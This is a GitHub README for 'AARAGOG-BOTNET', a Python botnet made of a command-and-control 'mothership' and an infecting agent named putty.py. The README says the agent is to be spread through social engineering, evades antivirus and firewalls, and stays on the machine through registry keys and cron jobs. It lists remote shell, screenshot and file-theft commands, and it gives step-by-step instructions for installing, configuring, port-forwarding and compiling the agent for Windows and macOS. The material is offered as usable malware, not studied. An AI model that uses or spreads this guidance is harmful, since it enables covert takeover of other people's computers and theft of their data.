# AARAGOG-BOTNET
A botnet handler and intellegent agnet purely in python.

<img width="369" alt="logo" src="https://user-images.githubusercontent.com/33318594/33236740-be552d80-d282-11e7-9a36-ca98c1a36593.png">


# INTRODUCTION
----

Aragog is the combination of a botnet handler (mothership) and a infecting script(agent) purely written in python that can make other computers slave (bot) of the mothership.The infecting script is named putty and must be administered on other computers using social engineering.
The mothership provides the functionality of simultaneously handling and listening for  multiple bots.
>Aragog is made open source so other people can contribute in adding more functionality to the mothership.


# FEATURES
----
- User can interact with one bot while  mothership is still listening for incoming connection from other bots.
- A low level client server model that does not trigger antivirus or firewalls.
- New connections are appended to a bot table that can be used later.
- The infecting script (agent) provides feature of persistence on all major platforms like windows (by adding a registry key) , mac os(adding a cronjob in crontab).
- The script copies itself into the documents folder of system and autoruns on reboot so that it works even if the original file is deleted by user.
- It **works over wan also** provided there is an ip connectivity btween the mothership and bot.
- Some commands that can be run on the bots-



|      COMMAND      | DESCRIPTION                                            |
|:-----------------:|--------------------------------------------------------|
|        exit       | back to mothership(stay connected to the bot)          |
|        help       | see this table                                         |
|     screenshot    | take a screenshot of bot and save to cwd of mothership |
|  shell*<command>  | execute a shell command on bot                         |
|  grab*<file_name> | transfer a file from cwd of bot to cwd of mothership   |
| upload*<filename> | transfer a file from cwd of mothership to cwd of bot   |
|     cd*<path>     | change cwd of bot                                      |
  
  
  
- A user with knowledge of python can write his own functionalities that can be easily incorporated into the existing bots.
- One can easily view the currently connected bots using the showbots command and connect with any one of them using command: ```python connect <index> ```

<img width="252" alt="screen shot 2017-11-26 at 8 31 44 am" src="https://user-images.githubusercontent.com/33318594/33236790-4b5ad878-d284-11e7-88d5-0324e1a01259.png">


- User can quit the script safely using the exit command and the bots will go to sleep for 100 sec.After which they will go back to the task of trying to connect back to the mothership.So when the person starts the mothership again his bots will connect back again.
- For reconnaissance the bot table provides the user with ip port and operating system of the bot so that user can use the correct shell commands.

# HOW TO INSTALL
----
## MOTHERSHIP
- To install just open the terminal and type:
```sh 
git clone https://github.com/neiltyagi/AARAGOG-BOTNET.git
```

To launch the mothership go to the installed folder and type
```python
serverbotnet.py <ip address> <port>
```
THE IP ADDRESS MUST BE YOUR LOCAL IP IF YOU WANT TO USE IN LAN.
TO USE IN WAN USE YOUR GLOBAL IP WITH APPROPRIATE PORT FORWARDING ON THE ROUTER.
refer
https://www.wikihow.com/Set-Up-Port-Forwarding-on-a-Router
>NOTE for best results use the mothership on Kali linux .however it will work on any system with python installed.

## AGENT
>NOTE agent is by the name of putty.py don't rename it to anything other than putty.(required for the persistence functionality

- Open the putty.py file using any text editor
- Edit the IP and port fields to the IP and port you used above
- Save the file.
### TO ADMINISTER ON WINDOWS
Compile the putty.py into a binary with no dependencies using pyinstaller or anyother of your choice.
refer to: 
https://youtu.be/lOIJIk_maO4

### TO ADMINISTER ON MAC OSX
For now it is a little tricky but i am working on simplifying it.
the simplest thing you can do right now ,provided the system has python installed is run the script in .py format on the mac system. it will automatically copy itself to the Documents folder and make a cronjob for it to run on every reboot so u don't have to run it  again.



# UPDATES
----
New updates and bug fixes rolling out soon.



